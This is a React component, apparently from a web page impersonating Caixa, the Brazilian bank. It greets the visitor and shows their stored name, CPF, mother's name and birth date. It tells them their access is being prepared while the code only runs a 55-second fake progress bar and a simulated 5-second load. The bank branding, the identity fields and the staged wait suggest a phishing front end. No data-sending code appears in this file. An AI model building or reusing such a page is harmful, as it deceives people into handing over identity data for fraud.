import { useState, useEffect } from "react";
import logo from "../assets/caixa.webp";
import { UserData } from "../types/userData";
import dayjs from "dayjs";
import { FaSpinner } from "react-icons/fa";
import Vimeo from '@u-wave/react-vimeo';

export function Loading() {
    const [progress, setProgress] = useState(0);
    const [loadingData, setLoadingData] = useState(true);
    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        nomeMae: "",
        email: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);


    // Função para atualizar a barra de progresso de forma fluida em 30 segundos
    useEffect(() => {
        const start = Date.now();
        const duration = 55000; // 30 segundos

        const updateProgress = () => {
            const timeElapsed = Date.now() - start;
            const newProgress = Math.min((timeElapsed / duration) * 100, 100);

            setProgress(newProgress);

            if (newProgress < 100) {
                requestAnimationFrame(updateProgress);
            }
        };

        updateProgress();

        // Simulação de carregamento dos dados do usuário
        setTimeout(() => {
            setLoadingData(false); // Carregamento concluído
        }, 5000); // Simulação de 5 segundos
    }, []);

    const isButtonDisabled = progress < 100; // Verifica se o botão deve ser desativado

    return (
        <div className="w-screen h-screen flex flex-col items-center px-6 space-y-5 mt-6">
            <header className="flex flex-col items-center p-4 space-y-3">
                <img width={170} src={logo} alt="logo" />
                <span className="text-blue-800">Seja bem vindo, {userData.nome.split(" ")[0]}</span>
            </header>

            <div className="px-2">
                <Vimeo
                    video="1032190090"
                    autoplay
                    width={360}
                    showTitle={false}
                />
            </div>

            <div className="text-center">
                <h2 className="text-lg text-zinc-500 mb-2">Estamos preparando seu acesso...</h2>
                <p className="text-sm text-zinc-400">
                    Aguarde enquanto o sistema carrega suas informações
                </p>
            </div>

            {/* Barra de progresso fluida */}
            <div className="w-full bg-gray-300 rounded-full h-4">
                <div
                    className="bg-orange-500 h-4 rounded-full transition-all ease-linear"
                    style={{ width: `${progress}%` }}
                />
            </div>



            <span className="text-sm text-zinc-600">
                {Math.floor(progress)}% concluído
            </span>

            <div className="px-3 w-full">
                {isButtonDisabled! ? (
                    <button
                        className="w-full py-3 rounded-md text-white text-xl focus:outline-none bg-zinc-400 opacity-60"
                        disabled
                    >
                        <div className="flex items-center justify-center space-x-2">
                            <FaSpinner className="animate-spin" />
                            <span>Carregando</span>
                        </div>
                    </button>

                ) : (
                    <a href="/menu" className="w-full">
                        <button
                            className="w-full py-3 rounded-md text-white text-xl focus:outline-none bg-orange-500 hover:bg-orange-600 animate-bounce mt-3"
                        >
                            Próxima etapa
                        </button>
                    </a>
                )}
            </div>
            <div className="w-full mt-6">
                {loadingData ? (
                    <div className="space-y-2">
                        <div className="h-6 bg-gray-300 rounded w-3/4 animate-pulse"></div>
                        <div className="h-6 bg-gray-300 rounded w-1/2 animate-pulse"></div>
                        <div className="h-6 bg-gray-300 rounded w-2/3 animate-pulse"></div>
                    </div>
                ) : (
                    <div className="space-y-2 text-left">
                        <p className="text-zinc-600">
                            <strong>Nome Completo:</strong> {userData?.nome}
                        </p>
                        <p className="text-zinc-600">
                            <strong>CPF:</strong> {userData?.cpf}
                        </p>
                        {userData?.nomeMae && (
                            <p className="text-zinc-600">
                                <strong>Nome da mãe:</strong> {userData.nomeMae}
                            </p>
                        )}
                        <p className="text-zinc-600">
                            <strong>Data de Nascimento:</strong> {dayjs(userData?.dataNascimento).format("DD/MM/YYYY")}
                        </p>
                    </div>
                )}
            </div>


        </div>
    );
}
